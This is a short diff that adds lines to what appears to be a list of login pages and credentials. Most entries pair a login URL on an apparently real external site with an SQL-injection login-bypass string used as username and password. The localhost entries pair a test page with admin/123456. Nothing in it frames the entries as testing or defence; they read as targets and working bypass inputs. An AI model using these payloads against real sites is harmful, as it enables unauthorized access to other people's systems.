@@ -1,0 +1,6 @@
+http://www.piaoliuhk.com/login.php	        admin' or '1'='1' or 1=1/admin' or 'a'='a
+http://data.chinajci.com:80/	        admin' or 'a'='a/'or'='or'
+http://data.chinajci.com:80/login.asp	        admin' or 'a'='a/'or'='or'
+http://127.0.0.1/lg/login.html	        admin/123456
+http://127.0.0.1/lg/login.html	        admin/123456
+http://127.0.0.1/lg/login.html	        admin/123456
